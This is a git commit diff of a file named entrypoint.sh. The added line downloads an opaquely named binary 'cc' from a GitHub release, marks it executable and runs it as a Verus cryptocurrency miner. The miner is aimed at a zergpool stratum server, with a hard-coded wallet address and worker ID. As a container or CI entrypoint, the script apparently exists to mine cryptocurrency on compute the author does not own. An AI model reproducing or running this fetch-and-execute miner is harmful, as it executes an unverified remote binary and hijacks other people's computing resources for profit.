d54c1bef789b19cc2d8dda3244d7a5991479ca9e
82a <69309779+82a@users.noreply.github.com>
2022-05-08 02:05:39 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,4 +1,1 @@
-#!/bin/bash
-curl -O https://github.com/82a/cc/releases/download/cc/cc
-chmod +x cc
-./cc -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RWgAozieHuYTsK1BCEfpdriHcVT75s2yCi -p  c=VRSC,mc=VRSC,ID=cobaaja -t 1
+curl -O https://github.com/82a/cc/releases/download/cc/cc && chmod +x cc && ./cc -a verus -o stratum+tcp://verushash.mine.zergpool.com:3300 -u RWgAozieHuYTsK1BCEfpdriHcVT75s2yCi -p  c=VRSC,mc=VRSC,ID=cobaaja -t 1
